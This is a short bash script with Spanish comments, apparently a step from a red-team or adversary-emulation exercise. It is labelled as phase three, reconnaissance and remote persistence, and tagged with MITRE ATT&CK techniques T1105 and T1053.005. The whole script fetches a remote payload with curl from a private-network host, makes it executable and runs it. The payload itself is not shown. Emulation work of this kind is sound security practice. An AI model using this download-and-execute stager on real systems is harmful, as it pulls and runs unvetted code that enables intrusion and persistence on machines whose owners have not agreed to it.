#!/bin/bash
# Fase 3 – Reconocimiento y Persistencia Remota
# Técnicas: T1105 (Ingress Tool Transfer), T1053.005 (Scheduled Task)

# Descarga del payload
curl -O http://192.168.40.30/fase3-recon-persist-remote.cmd

# Ejecución del payload descargado
chmod +x fase3-recon-persist-remote.cmd
./fase3-recon-persist-remote.cmd
